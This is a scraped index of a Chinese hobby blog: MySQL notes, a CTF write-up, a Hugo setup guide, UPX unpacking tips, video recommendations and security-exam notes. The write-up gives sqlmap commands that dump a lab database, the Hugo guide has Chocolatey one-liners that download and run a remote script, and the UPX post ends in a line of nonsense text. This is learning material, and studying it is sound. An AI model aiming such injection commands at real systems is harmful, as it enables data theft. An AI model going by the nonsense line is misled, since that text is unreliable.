(最大值为65535) SET 一个设置，字符串对象可以有零个或 多个SET成员 1、2、3、4或8个字节，取决于集合 成员的数量（最多64个成员） 二进制类型 类型名称 说明 存储需求 BIT(M) 位字段类型 大约 (M+7)/8 字节 BINARY(M) 固定长度二进制字符串 M 字节 VARBINARY (M) 可变长度二进制字符串 M+1 字节 TINYBLOB (M) 非常小的BLOB L+1 字节，在此，L\u0026lt;2^8 BLOB (M) 小 BLOB L+2 字节，在此，L\u0026lt;2^16 MEDIUMBLOB (M) 中等大小的BLOB L+3 字节，在此，L\u0026lt;2^24 LONGBLOB (M) 非常大的BLOB L+4 字节，在此，L\u0026lt;2^32 权限一览表 具体权限的作用详见官方文档\nGRANT 和 REVOKE 允许的静态权限\nPrivilege Grant Table Column Context ALL [PRIVILEGES] Synonym for “all privileges” Server administration ALTER Alter_priv Tables ALTER ROUTINE Alter_routine_priv Stored routines CREATE Create_priv Databases, tables, or indexes CREATE ROLE Create_role_priv Server administration CREATE ROUTINE Create_routine_priv Stored routines CREATE TABLESPACE Create_tablespace_priv Server administration CREATE TEMPORARY TABLES Create_tmp_table_priv Tables CREATE USER Create_user_priv Server administration CREATE VIEW Create_view_priv Views DELETE Delete_priv Tables DROP Drop_priv Databases, tables, or views DROP ROLE Drop_role_priv Server administration EVENT Event_priv Databases EXECUTE Execute_priv Stored routines FILE File_priv File access on server host GRANT OPTION Grant_priv Databases, tables, or stored routines INDEX Index_priv Tables INSERT Insert_priv Tables or columns LOCK TABLES Lock_tables_priv Databases PROCESS Process_priv Server administration PROXY See proxies_priv table Server administration REFERENCES References_priv Databases or tables RELOAD Reload_priv Server administration REPLICATION CLIENT Repl_client_priv Server administration REPLICATION SLAVE Repl_slave_priv Server administration SELECT Select_priv Tables or columns SHOW DATABASES Show_db_priv Server administration SHOW VIEW Show_view_priv Views SHUTDOWN Shutdown_priv Server administration SUPER Super_priv Server administration TRIGGER Trigger_priv Tables UPDATE Update_priv Tables or columns USAGE Synonym for “no privileges” Server administration GRANT 和 REVOKE 允许的动态权限\nPrivilege Context APPLICATION_PASSWORD_ADMIN Dual password administration AUDIT_ABORT_EXEMPT Allow queries blocked by audit log filter AUDIT_ADMIN Audit log administration AUTHENTICATION_POLICY_ADMIN Authentication administration BACKUP_ADMIN Backup administration BINLOG_ADMIN Backup and Replication administration BINLOG_ENCRYPTION_ADMIN Backup and Replication administration CLONE_ADMIN Clone administration CONNECTION_ADMIN Server administration ENCRYPTION_KEY_ADMIN Server administration FIREWALL_ADMIN Firewall administration FIREWALL_EXEMPT Firewall administration FIREWALL_USER Firewall administration FLUSH_OPTIMIZER_COSTS Server administration FLUSH_STATUS Server administration FLUSH_TABLES Server administration FLUSH_USER_RESOURCES Server administration GROUP_REPLICATION_ADMIN Replication administration GROUP_REPLICATION_STREAM Replication administration INNODB_REDO_LOG_ARCHIVE Redo log archiving administration NDB_STORED_USER NDB Cluster PASSWORDLESS_USER_ADMIN Authentication administration PERSIST_RO_VARIABLES_ADMIN Server administration REPLICATION_APPLIER PRIVILEGE_CHECKS_USER for a replication channel REPLICATION_SLAVE_ADMIN Replication administration RESOURCE_GROUP_ADMIN Resource group administration RESOURCE_GROUP_USER Resource group administration ROLE_ADMIN Server administration SESSION_VARIABLES_ADMIN Server administration SET_USER_ID Server administration SHOW_ROUTINE Server administration SYSTEM_USER Server administration SYSTEM_VARIABLES_ADMIN Server administration TABLE_ENCRYPTION_ADMIN Server administration VERSION_TOKEN_ADMIN Server administration XA_RECOVER_ADMIN Server administration 图形化界面工具 Workbench(免费): http://dev.mysql.com/downloads/workbench/ navicat(收费，试用版30天): https://www.navicat.com/en/download/navicat-for-mysql Sequel Pro(开源免费，仅支持Mac OS): http://www.sequelpro.com/ HeidiSQL(免费): http://www.heidisql.com/ phpMyAdmin(免费): https://www.phpmyadmin.net/ SQLyog: https://sqlyog.en.softonic.com/ 安装 小技巧 在SQL语句之后加上\\G会将结果的表格形式转换成行文本形式 查看Mysql数据库占用空间： 1 2 3 4 SELECT table_schema \u0026#34;Database Name\u0026#34; , SUM(data_length + index_length) / (1024 * 1024) \u0026#34;Database Size in MB\u0026#34; FROM information_schema.TABLES GROUP BY table_schema; 后续内容 后续内容因为跟当前学习、工作计划有冲突，所以后续课程的学习计划会无限期推后。 目前的工作重点放在重做一个学习笔记网站，当然这是边做边学的，开发过程中遇到的难点和知识点我也会记录下来供大家学习。 在此感谢B站同样爱学习的同学 @守心-人 提供的后续课程笔记，大家有条件一定要去给个star，你的每一个star和点赞都是我们前进的动力 https://github.com/Buildings-Lei/mysql_note/blob/main/README.md\n","date":"2024-05-11T21:17:31+08:00","permalink":"https://hack.liagu-one.top/p/50a4c39/","title":"MYSQL语法"},{"content":"理论题: 刚好考了NISP,题目类似就很爽\nCTF: 四道题就做了三道\n大草原 简单的sql注入\n开始的url\n1 172.20.2.4/100510015-1f0b4914/ 提示辽阔的大草原\n辽阔美丽的大草原一碧千里，骏马奔腾、小羊吃草、套马摔跤、烤羊喝酒终于来到了大草原的你，赶紧去寻找草原上的骏马吧！哒哒哒 输入ID作为参数寻找即可。 它们在哪呢？它们又有几匹呢？找到它们你就可以获取flag哦\n1 http://172.20.2.4/100510015-1f0b4914/index.php?id=1 sql注入\n数据库\n1 sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 --dbs 表\n1 sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 --tables 列\n1 sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse --columns 名\n1 sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse -C where/id/number --dump base 拖进txt得到base64\n1 Wm14aFozdDBhR2sxWDJsVFgwWXhRR2RmTXpJeGZRPT0= 解码两次\n1 flag{thi5_iS_F1@g_321} 流量分析 wireshark分析,tcp追踪流\n010打开找到base64\n","date":"2024-04-27T16:38:02+08:00","permalink":"https://hack.liagu-one.top/p/87568/","title":"(hu)2024育才杯"},{"content":"前言 在经历了wp,typecho,emblog等搭建的blog之后,总感觉花里胡哨的东西太多,即使是typecho比较简洁,但是要用服务器(主要问题),而且php还比较吃内存索性选择GitHubpages免费搭建个hugo咯,中间也踩过不少坑,下面详细说说\nhugo搭建 在Windows上安装Hugo\n下面是官方文档里面的\n版本 Hugo有两个版本：标准版和扩展版。使用扩展版，您可以：\n在处理图像时，将图像编码为WebP格式。无论您使用哪个版本，都可以解码WebP图像。 使用内置的LibSass转译器，将Sass转译为CSS。使用Dart Sass转译器时不需要扩展版。 我们建议您安装扩展版。\n所以我们选择安装扩展版\n安装前先安装go和git Git（安装指南） Go（安装指南） 之后是包管理器 (任意一个) Chocolatey Chocolatey是Windows上的一个免费且开源的包管理器。这将安装Hugo的扩展版：\n1 choco install hugo-extended Scoop Scoop 是Windows上的一个免费且开源的包管理器。这将安装Hugo的扩展版：\n1 scoop install hugo-extended Winget Winget 是Microsoft的官方免费且开源的Windows包管理器。这将安装Hugo的扩展版：\n1 winget install Hugo.Hugo.Extended 但是会提示**\u0026lsquo;choco\u0026rsquo; 不是内部或外部命令，也不是可运行的程序** **或批处理文件。**这样就在官网安装任意一个Chocolatey 软件文档 |设置/安装这里用choco(建议powershell安装) cmd安装choco的命令\n1 @\u0026#34;%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34; -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \u0026#34;[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://community.chocolatey.org/install.ps1\u0026#39;))\u0026#34; \u0026amp;\u0026amp; SET \u0026#34;PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\u0026#34; powershel安装choco的命令\n1 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\u0026#39;https://community.chocolatey.org/install.ps1\u0026#39;)) 然后hugo安装完成了\n1 hugo --version 即可看版本\nhugo新建文章 创建 Hugo 网站 通过上述命令安装 hugo 程序后，就可以通过 hugo new site 命令进行网站创建、配置与本地调试了。\n1 hugo new site blog-test 配置主题 当通过上文命令创建我们的站点后，需要进行主题配置，Hugo 社区有了很丰富的主题，可以通过官网 Themes 菜单选择自己喜欢的风格，查看预览效果，选择后可以进入主题项目仓库，一般都会有很详细的安装及配置说明。下面我就以我目前在使用的 hugo-theme-den 这个主题为例，演示一下配置流程。\n配置hugo.toml 1 2 3 4 baseURL = \u0026#39;https://username.github.io/\u0026#39; languageCode = \u0026#39;en-us\u0026#39; title = \u0026#39;XXX blog\u0026#39; theme = \u0026#34;FixIt\u0026#34; 完成后，可以通过 hugo new 命令发布新文章。\n1 hugo new posts/blog-test.md 然后开启网站服务\n1 hugo server -D 新项目的提交方式 1、\n1 git init 把这个文件夹变成Git可管理的仓库。\n2、\n1 git add . 把该目录下的所有文件添加到仓库\n3、\n1 git commit -m \u0026#34;first commit\u0026#34; 把项目提交到仓库。\n4、\n1 git remote add origin ... (将本地仓库与GitHub上创建好的目标远程仓库进行关联。 …后面加的是GitHub目标仓库地址)。\n5、\n1 git push -u origin master 把本地库的所有内容推送到GitHub远程仓库上。\n版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。 原文链接：https://blog.csdn.net/qq_45830543/article/details/116134285\n提交更新blog步骤 1.先执行\n1 hugo server -D 构建public的静态页面\n2.进入public目录,依次执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1、添加到本地仓库 git add . 2、添加提交描述 git commit -m ‘提交’ 3、提交前先从远程仓库主分支中拉取请求 gitpull origin master 4、把本地仓库代码提交 git push -u origin master ","date":"2024-04-27T14:34:31+08:00","permalink":"https://hack.liagu-one.top/p/0492dcd/","title":"Blog新建之始"},{"content":" 识别UPX壳 逆向的第一步通常是确认程序是否使用了UPX壳。这可以通过查看文件头信息、使用PE查看器检查导入表（Import Table）是否被UPX修改过，或者直接用upx -d尝试解压文件来判断。\n脱壳 (Unpacking) 如果确定程序被UPX加壳，可以使用UPX本身来解压或“脱壳”：\nBash\n1 1upx -d suspected_program.exe 这条命令尝试解压缩suspected_program.exe，生成未压缩的原始可执行文件。成功后，原始程序将不再含有UPX壳，便于进一步的逆向分析。\n分析与调试 脱壳之后，可以使用逆向工程工具（如IDA Pro, Ghidra, OllyDbg, x64dbg等）来深入分析程序的汇编代码、函数调用、数据结构等。\n处理特殊情况 有时，程序可能使用了自定义或修改版的UPX壳，导致直接使用UPX脱壳失败。这种情况下，可能需要手动定位脱壳代码入口点，理解其工作原理，并编写脚本或修改UPX源码来适应这种特定壳。\n查找线索 在逆向过程中，注意寻找UPX壳留下的线索，比如特定的字符串、代码模式或导入的UPX相关函数，这些都可以帮助确认壳的存在并指导如何去除它。\n收到v服务规律i撒故后世爸爸说都i擦比较萨斯都v比较你\n","date":"2024-04-27T14:34:31+08:00","permalink":"https://hack.liagu-one.top/p/0492dcd/","title":"upx-usage"},{"content":"建议大家学不进去的时候都看看油管博主 每次学习没有动力的时候，我都喜欢看一些学习博主的vlog,现在真的很喜欢看油管学霸的vlog，他们都是世界名校的学生，看他们学习真的很治愈，同时他们会分享很多学习的方法，有时候真的会惊叹：还能这样学？\n计算机 Abdul Bari\n▪️这个老哥是真的想教会咱的计算机🥺！！各个章节想看什么可以直接搜索，涵盖很多内容\nJohn Fish\n哈佛小哥，计算机科学学霸 分享学习和效率方法，此外也会分享一些书单和阅读心得 ◾️《如何利用心流从不爱学习到享受学习》 ◾️《成为高效学习者的4个习惯》\nTelusko\n▪️内容主要涉及python，java，区块链等方面，一般一个视频时长10-20分钟左右。💻很适合零基础想学习python的同学\nJenny\u0026rsquo;s Lectures CS IT\n▪️对CS专业的同学很友好，赶紧来抱大腿！不过视频里经常英语夹杂着印度\nTanmay Bakshi\n印度天才少年，9岁发布自己的第1️⃣个苹果应用程序，12岁成为IBM的荣誉顾问，用通俗易懂的语言讲解各种编程知识\nmy code school\n现在内外都能看到他的课程，虽然已经不再更新，但是现有的课程内容已经特别丰富。\nprogramming with mosh\n有javaScript、C语言等内容，非常基础，很适合新入门的小白学习\nFree Code Camp\nFree Code Camp 是一个非盈利组织网站，其目的是帮助人们学习代码，完全免费。\nThe New Boston\nThe New Boston 是 YouTube 上最受欢迎的网络开发频道之一\nComputerphile\n涵盖非常广泛的技术概念，从计算机硬件、软件到密码学、数据科学、人工智能等各种主题\nTraversy Media\nTraversy Media 上的视频对作为 Web 开发人员具有一定专业知识的个人更有帮助\nClever Programmer\n由Rafeh Qazi创建的Clever Programmer，为用户提供了最好的Web开发课程\nCS Dojo\nCS Dojo 是在谷歌任职的程序员 YK Sugi 所创建，他的视频集包含有关数据科学、ML、Django、Web 开发框架和创造性的问题解决\nProgrammingKnowledge\n一个关于前端和后端的技术频道。它的一些可成非常适合那些刚刚开始学习编程的人\nCoding Train\nCoding Train 是由程序员 Daniel Schiffman 主持的一个受欢迎且有趣的频道\nDerek Banas\n它还提供前端和后端的全方位Web开发技术教程\n数学 Numberphile\n数学大佬都在看的学习频道，探索各种数学知识。在这里，只有原汁原味的硬核讲解。\nKhan Academy\n▪️这个大家应该都知道！里面有很多的印度老师，学高数、概率这些都可以来看！\n英语 English with Lucy 跟着Lucy学英语\n颜值高，专注英式英语、高级词汇，在油管人气非常旺。up: 跟着Lucy学英语\nLearn English with Bob the Canadian\n和加拿大鲍勃学英语\n这个频道非常火爆，是我公司做亚马逊的小哥推 荐的，语速慢，简单实用。up: 听学英语吧\nSydney Serena\n一位教英语的小姐姐，英语口语说的真的很纯正 ◾️《跟着油管vlog学英语》\nBBC 官 方英标教程\n想提升发音的同学必看，BBC官 方出品，这个系列很经典，up：今天你又没学习\nspeak English with Vanessa\n6.25m\nLearn English with TV series\n这个系列的《生活大爆炸》，《艾伦秀》，《老友记》以及电影系列都收获了很多订阅者的喜欢。\n哥伦布 Little Columbus\n这是一位来自台湾的小哥，主要分享英文发音，日常英语的用法，有着很魔性的开场白，很有趣味性，视频内容为中英混和，对小白也很友好！\nMaxxter English\n这是一位生活在美国的小姐姐，中英文都特别好，她的视频涉及生活话题，还有一些贴合实事的话题，实用性超高！她的中英字幕很准确，而且还会用正常速度和慢速朗读，确保你能听清发音！ ·\nMad English\n这个博主是加拿大人，会教授大家一些基础的生活会活英国，他的视频是PPT➕真人讲解，视频纯英文，但内容不难，可以锻炼自己的听力！ ·\nJamesEngvid\n看他的视频就像在看脱口秀，博主是一个加拿大黑人，很会卖萌，上课会板书，一边讲解一边补充，语速偏快，更偏向教一些native speaker的用法，还有当堂练习，检验学习成果！ ·\n7ESL Learning English\n唯一一个没有人设的英语学习博主，ESL的全科是English as Second Language，对外国人很友好，内容丰富，有语法、单词、日常会话……\n医生 Ninja Nerd\n▪️真的是医学生的救命prof！👨‍⚕️创始人Zach Murphy和他好朋友 Robert和 Christian，共同创办了频道Ninja Nerd，希望借此以一种影响更大的方式普惠医学生\nAli Abadaal\n剑桥医学院毕业的学霸博主，在油管上有超过500万粉丝 做博主、做生意、学习、写书都能兼顾，分享的学习方法、效率、个人成长等干货都很受用！ ◾️《用一年的时间彻底改变人生，活成自己想要的样子》 ◾️《用5种方法找到人生方向》 ◾️《3.5小时沉浸式学习，番茄时钟+写作业音乐，集中注意力》\nElizabeth Flips\n伦敦国王学院的医学生，同时是油管百万博主，画家，作家，博客主理人 她真的对于传统学习/效率方法有着独特的视角，看她的视频能让你接纳自己，找到自己的节奏与方法 ◾️《没有天生的笨人，如何用简单的方式做复杂的事》 ◾️《学霸的学习方法总结！告诉你最强大的学习动力！》\nElly\n又是一位医学生，她的视频真的很给大家续学习动力 看她的视频就是喝咖啡☕️，学习 ◾️《韩国女医学生紧张的10天期末考试vlog》 ◾️《心脏病考试前72小时》\n网安 综合网络安全覆盖 Hak5 ITPrOTV DC CyberSec David Bombal Network Chuck InfoSec Live Security Weekly Hack eXPlorer Cyber CDH Black Hills Information Security\n漏洞赏金和道德黑客 The XSS Rat Bugcrowd Nahamsec InsiderPHD HackerSploit Z-winK University Peter Yaworski STÃK LiveOverflow The Cyber Mentor\n教育和教程(各种主题) Computerphile lppSec MalwareTechBlog The Hated One Joe Collins The Pc Security Channel\n认证和职业发展 0utpost Gray Professor Messer Cyberspatial Simply Cyber\nWeb应用安全 OWASP Foundation Security Now Null Byte\n云安全 Day Cyberwox\n攻击性安全和渗透测试 SANS Offensive Operations Offensive Security Pentester Academy TV\n会议和技术演讲 Black Hat DEFCONConference\n恶意软件分析和取证 John Hammond 13Cubed BlackPerl\n干货 edureka!\n在这里您可以找到当今许多热门主题的教学课程详细信息\nThomas Frank\nThomas是一位时间管理和自律方面的专家，看了他讲的一些东西，我的时间管理能力提升了不少。国内也有很多搬运的，应该很多都能看。\nJessica Kobeissi\nJessica是一位摄影师，她的内容丰富多彩，从拍摄技巧到后期处理都有详细讲解。她还会分享很多实用的摄影设备经验。前年买的相机一直在吃灰，正好可以拿出来用。\nTED\nTED频道汇集了来自全球各地的演讲者，他们分享的内容涵盖了科技、教育、文化、心理学等各种领域。当今世界每分每秒都在变化，真的不学不行看这个接触前沿的观点和创新的想法拓宽了我的视野，认识世界真的可以看TED 。\nRuby Granger\n超级能学的学习博主！本科申请牛津失败，没放弃终于申请上牛津研究生 在油管分享学习技巧、阅读、生活等等，很受人欢迎 ◾️《如何正确利用休息时间》 ◾️《如何阅读更多的书？这一年，我阅读了150本书》 ◾️《学霸的温书日/学习日时间表规划》\necoholics\n▪️经济相关专业同学们的救星！🙏用白板就能拯救我的微观，宏观，特别喜欢里面一个印度姐姐\nSahil \u0026amp; Sarra\n▪️转码人必看！Sarra和Sahil都在大厂就职，分享各种data知识，也有就职相关的\n","date":"2023-09-12T12:53:38+08:00","permalink":"https://hack.liagu-one.top/p/%E6%B2%B9%E7%AE%A1up%E6%8E%A8%E8%8D%90/","title":"油管up推荐"},{"content":"恢复上一次关闭的浏览器页面\n1 Ctrl+Shift+T 查看历史剪切板\n1 Win+V 匿名访问(无痕浏览,懂得都懂)\n1 Ctrl+Shift+N ","date":"2023-08-27T11:34:52+08:00","permalink":"https://hack.liagu-one.top/p/%E7%94%B5%E8%84%91%E5%BF%AB%E6%8D%B7%E9%94%AE/","title":"电脑快捷键"},{"content":"2022 ","date":"2022-08-29T13:29:17+08:00","permalink":"https://hack.liagu-one.top/rk/%E8%BD%AF%E8%80%83%E7%9C%9F%E9%A2%98/","title":"软考真题"},{"content":"2022重点 选择 CIA三特性：C机密性，I完整性，A可用性\n网络安全信息系统（略偏）\n国密算法(重点)\n算法名称 特征描述 SM1 对称加密，分组长度和密钥长度都为128比特 SM2 非对称加密，用于公钥加密算法、密钥交换协议、数字签名算法(椭圆曲线问题) SM3 杂凑算法(哈希)，分组512位，输出杂凑值长度为256位 SM4 对称加密，分组长度和密钥长度都为128比特 SM9 标识密码算法，支持公钥加密、密钥交换、数字签名等安全功能 域名故障：域名系统出现网络与信息安全事件时，应当在24小时内向电信管理机构报告。\n**密码分类：**核心密码，普通密码，商用密码\n核心密码、普通密码用于保护国家秘密信息，属于国家秘密，由密码管理部门依法实行严格统一管理。商用密码用于保护不属于国家秘密的信息，公民、法人和其他组织均可依法使用。\n法律实施日期\n密码法 数据安全法 网络安全法 攻击树\n优点:采取专家的头脑风暴法，并将这些意见融合到攻击树中去，能够进行费效分析或者概率分析，能够建模非常复杂的攻击场景。 缺点:树内部存在限制，攻击树不能用于建模多重尝试攻击、时间依赖及访问控制等场景，不能用来建模循环事件，对于现实的大规模网络，处理起来会特别复杂。 攻击设计后门的方法\n放宽文件许可权; 重新开放不安全的服务如REXD、TFTP等； 修改系统的配置，如系统启动文件、网络服务配置文件等； 替换系统本身的共享库文件； 修改系统的源代码，安装各种特洛伊木马； 安装嗅探器:建立隐蔽信道。 主动攻击和被动攻击\n主动攻击涉及修改数据流或创建错误的数据流，它包括假冒、重放、修改信息和拒绝服务等 被动攻击是指一切窃密的攻击，典型的攻击方式是网络窃听和流量分析，通过截取数据包或流量分析，从中窃取重要的敏感信息。 常见的拒绝服务攻击\n(1)同步包风暴(SYNFlooding):利用TCP协议缺陷发送大量伪造的TCP连接请求，使得被攻击者资源耗尽。三次握手，进行了两次，不进行第三次握手，连接队列处于等待状态，大量这样的等待，会占满全部队列空间，使得系统挂起。 (2)Smurf攻击:攻击者伪装目标主机向局域网的广播地址发送大量欺骗性的ICMP请求，这些包被放大，并发送到被欺骗的地址，大量的计算机向一台计算机回应ECHO包，目标系统会崩溃。 (3)Ping of Death攻击:攻击者故意发送大于65535字节的IP数据包给对方，导致内存溢出这时主机会出现内存分配错误而导致TCP/IP堆栈崩溃，导致死机。 (4)Teardrop攻击:分段攻击，伪造数据报文向目标主机发送含有重叠偏移的数据分段，通过将各个分段重叠来使目标系统崩溃或挂起。 (5)Winnuke攻击:针对windows系统开放的139端口，只要向该端口发送1字节的TCPO0B数据(TCP连接的一种特殊数据，设置了URG标志，优先级更高)，就可以使windows系统出现蓝屏错误，并且网络功能完全瘫痪。 (6)Land攻击:也是利用三次握手的缺陷进行攻击，将SYN数据包的源地址和目的地址都设置为目标主机的地址，目标主机向自己回以SYN+ACK包，导致自己又给自己回一个ACK并建立自己与自己的连接当这种无效连接达到一定的数量，目标主机将会拒绝新的连接请求。 (7)电子邮件轰炸:针对服务端口(SMTP端口，端口号25)的攻击，攻击者通过连接到邮件服务器的25端口，按照SMTP协议发送几行头信息加上一堆文字垃圾，反复发送形成邮件轰炸。 AES算法\n美国颁布AES时规定数据块的长度为128位，密钥的长度可分别选择为128位，192位或256位。\n三重DES\n标准定义了三种密钥选项:密钥选项1:三个密钥是独立的。 密钥选项2:K1和K2是独立的，而K3=K1。密钥选项3:三个密钥均相等，即K1=K2=K3。一般情况是用两个密钥对明文进行3次加密。假设两个密钥是K1和K2(K3=K1)，其算法步骤如下:\n①)用密钥K1进行DES加密。 ②)用K2对步骤1的结果进行DES解密。 ③)对步骤2的结果再使用密钥K1进行DES加密\nSSH(安全外壳协议)是基于公钥的安全应用协议\n由SSH传输层协议、SSH用户认证协议和SSH连接协议三个子协议组成，实现加密认证、完整性检查等多种安全服务。SSH传输层协议提供算法协商和密钥交换，并实现服务器的认证，最终形成一个加密的安全连接，该安全连接提供完整性、保密性和压缩选项服务。SSH用户认证协议:用于向服务器提供客户端用户鉴别功能。\nPGP(Pretty Good Privacy)\n是一个完整的电子邮件安全软件包(应用层)，PGP提供数据加密和数字签名两种服务。采用RSA公钥证书进行身份验证，使用IDEA进行数据加密，使用MD5进行数据完整性验证。\nPPDR模型\nPDRR模型:PDRR改进了传统的只有保护的单安全防御思想，强调信息安全保障的四个重要环节:\n保护(Protection)的内容主要有加密机制、数据签名机制、访问控制机制、认证机制、信息隐藏、防火墙技术等。 检测(Detection)的内容主要有入侵检测、系统脆弱性检测、数据完整性检测、攻击性检测等。 恢复(Recovery)的内容主要有数据备份、数据修复、系统恢复。 响应(Response)的内容主要有应急策略、应急机制、应急手段、入侵过程分析及安全状态评估等 BLP两个特性(防止非授权信息的扩散)\n简单安全特性。主体对客体进行读访问的必要条件是主体的安全级别不小于客体的安全级别，主体的范畴集合包含客体的全部范畴，即主体只能向下读，不能向上读。 *特性。一个主体对客体进行写访问的必要条件是客体的安全级支配主体的安全级，即客体的保密级别不小于主体的保密级别，客体的范畴集合包含主体的全部范畴，即主体只向上写，不能向下写。 BIBA模型\n等级保护五个等级\n层次 名称 程度 说明 一级 用户自主保护 自主 本级的计算机信息系统可信计算基通过隔离用户与数据，使用户具备自主安全保护的能力。它具有多种形式的控制能力，对用户实施访问控制，即为用户提供可行的手段，保护用户和用户组信息，避免其他用户对数据的非法读写与破坏。 二级 系统审计保护 指导 与用户自主保护级相比，本级的计算机信息系统可信计算基实施了粒度更细的自主访问控制，它通过登录规程、审计安全性相关事件和隔离资源，使用户对自己的行为负责。 三级 安全标记保护 监督 本级的计算机信息系统可信计算基具有系统审计保护级的所有功能。此外，还提供有关安全策略模型、数据标记以及主体对客体强制访问控制的非形式化描述;具有准确地标记输出信息的能力;消除通过测试发现的任何错误。 四级 结构化保护 强制 本级的计算机信息系统可信计算基建立于一个明确定义的形式化安全策略模型之上，它要求将第三级系统中的自主和强制访问控制扩展到所有主体与客体。此外，还要考虑隐蔽通道。 五级 访问验证保护 专控 本级的计算信息系统可信计算基满足访问监控器需求。访问监控器仲裁主体的全部访问。访问监控器本身是抗篡改的;必须足够小，能够分析和测试。系统具有很高的抗渗透能力。 NIST网络安全框架\n访问控制，意识和培训，数据安全，信息保护流程和规程，维护，保护技术\nIDC机房分三级\nR1级IDC机房的机房基础设施和网络系统的主要部分应具备一定的冗余能力，机房基础设施和网络系统可支撑的IDC业务的可用性不应小于99.5%。 R2级IDC机房的机房基础设施和网络系统应具备冗余能力，机房基础设施和网络系统可支撑的1D0业务的可用性不应小于99.9%。 R3级IDC机房的机房基础设施和网络系统应具备容错能力，机房基础设施和网络系统可支撑的IDC业务的可用性不应小于99.99%。\nKerberos系统涉及四个基本实体: (1)Kerberos客户机，用户用来访问服务器设备。 (2)AS(Authentication Server，认证服务器)，识别用户身份并提供TGS会话密钥。 (3)TGS(Ticket Granting Server，票据发放服务器)，为申请服务的用户授予票据(Ticket)。 (4)应用服务器(Application Server)，为用户提供服务的设备或系统。\nAS和TGS组成KDC\nPKI体系\n数字证书\nRA注册，CA签发\n也称公钥证书，是由证书认证机构(CA)签名的，包含公开密钥拥有者信息、公开密钥、签发者信息、有效期、以及扩展信息的一种数据结构。\n模型 访问控制模型\n主体:操作实施者，是人、进程或设备。 客体:被主体操作的对象。 参考监视器:访问控制的决策单元和执行单元的集合体。 访问控制数据库:记录主体访问客体的权限及访问方式的信息。 审计库:存储主体访问客体的操作信息。\n入侵检测模型\n自主访问控制(基于行基于列)\n基于行的自主访问控制:能力表、前缀表、口令。\n基于列的自主访问控制:保护位、访问控制表。\n包过滤防火墙\n标准访问控制格式\n扩展访问控制格式\nVPN安全服务\n保密性服务，完整性服务，认证服务\nVPN有多种实现技术，按照VPN在TCP/IP协议层的实现方式，可以将其分为链路层VPN网络层VPN、传输层VPN。\n链路层 VPN的实现方式有ATM、Frame Relay、多协议标签交换MPLS; 网络层VPN的实现方式有受控路由过滤、隧道技术 传输层VPN则通过SSL来实现。 IPSec协议\nAH:是一段报文认证代码，在发送IP包前已计算好。发送方用加密密钥计算出AH，接收方用另一密钥对其进行验证。提供数据源认证、数据完整性以及防中继保护。ESP:对整个IP包进行封装加密，通常使用DES算法。\nIKE:(DH)密钥交换\nSSL协议分为两层: (1)SSL记录协议(SSL Record Protocol)它建立在可靠的传输协议(如TCP)之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。\n(2)SSL握手协议(SSL Handshake Protocol)它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。\n误用检测系统方法：snort基于规则的误用检测方法，网络入侵检测系统\n物理隔离和逻辑隔离：网闸和防火墙\n网闸\n防火墙\n计算机信息系统安全保护能力5个等级\n级别类型 安全审计要求 用户自主保护级 无 系统审计保护级 计算机信息系统可信计算基能创建和维护受保护客体的访问审计跟踪记录，并能阻止非授权的用户对它访问或破坏。计算机信息系统可信计算基能记录下述事件:使用身份鉴别机制:将客体引入用户地址空间(例如:打开文件、程序初始化);删除客体;由操作员、系统管理员或(和)系统安全管理员实施的动作，以及其他与系统安全有关的事件。对于每一事件，其审计记录包括:事件的日期和时间、用户、事件类型、事件是否成功。对于身份鉴别事件，审计记录包含请求的来源(例如:终端标识符):对于客体引入用户地址空间的事件及客体删除事件，审计记录包含客体名。对不能由计算机信息系统可信计算基独立分辨的审计事件，审计机制提供审计记录接口，可由授权主体调用。这些审计记录区别于计算机信息系统可信计算基独立分辨的审计记录 安全标记保护级 在系统审计保护级的基础上，要求增强的审计功能是:审计记录包含客体名及客体的安全级别。此外，计算机信息系统可信计算基具有审计更改可读输出记号的能力 结构化保护级 在安全标记保护级的基础上，要求增强的审计功能是:计算机信息系统可信计算基能够审计利用隐蔽存储信道时可能被使用的事件 访问验证保护级 在结构化保护级的基础上，要求增强的审计功能是:计算机信息系统可信计算基包含能够监控可审计安全事件发生与积累的机制，当超过值时，能够立即向安全管理员发出报警。并且，如果这些与安全相关的事件继续发生或积累，系统应以最小的代价中止它们 Windows审计/日志机制:\n日志文件是Windows系统中一个比较特殊的文件，它记录Windows系统的运行状况，如各种系统服务的启动、运行、关闭等信息。Windows日志有三种类型:系统日志、应用程序日志和安全日志,它们对应的文件名为SysEvent.evt、AppEvent.evt和SecEvent.evt。这些日志文件通常存放在操作系统安装的区域“system32\\config”目录下。只允许系统管理员访问的是安全日志。\n网络审计数据保护常用的措施有:\n系统用户分权管理、审计数据强制访问、审计数据加密、审计数据隐私保护、审计数据完整性保护。\n利用漏洞\n安全漏洞来源\n技术性安全漏洞\n(1)设计错误 (2)输入验证错误 (3)缓冲区溢出 (4)意外情况处置错误 (5)访问验证错误 (6)配置错误 (7)竞争条件 (8)环境错误\n非技术性安全漏洞\n(1)网络安全责任主体不明确 (2)网络安全策略不完备 (3)网络安全操作技能不足 (4)网络安全监督缺失 (5)网络安全特权控制不完备\n工具软件\n工具名称 简要描述 Flawfinder 利用词法分析技术发现以C语言编写的源程序安全漏洞 Splint 检查以C语言编写的程序安全漏洞 ITS4 检查以C和C++语言编写的源程序安全漏洞 Grep 自定义漏洞模式，检查任意源程序安全漏洞 MOPS 利用状态机技术来分析以C语言编写的源程序安全漏洞 W3AF Web应用程序漏洞验证 Wireshark 